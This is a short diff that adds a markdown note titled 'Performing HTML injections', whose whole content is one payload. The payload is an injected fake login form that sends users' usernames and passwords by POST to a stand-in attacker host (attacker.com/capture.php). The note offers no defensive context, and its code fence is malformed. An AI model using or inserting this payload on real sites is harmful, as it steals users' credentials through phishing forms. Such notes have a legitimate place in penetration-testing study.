@@ -1,0 +1,10 @@
+# Performing HTML injections 
+
+
+Payloads 
+
+<```form method='POST' action='http://attacker.com/capture.php' id='loginform'>
+<input type='text' name='username' value=''>
+<input type='password' name='password' value=''>
+<input type='submit' value='submit'>
+</form>```
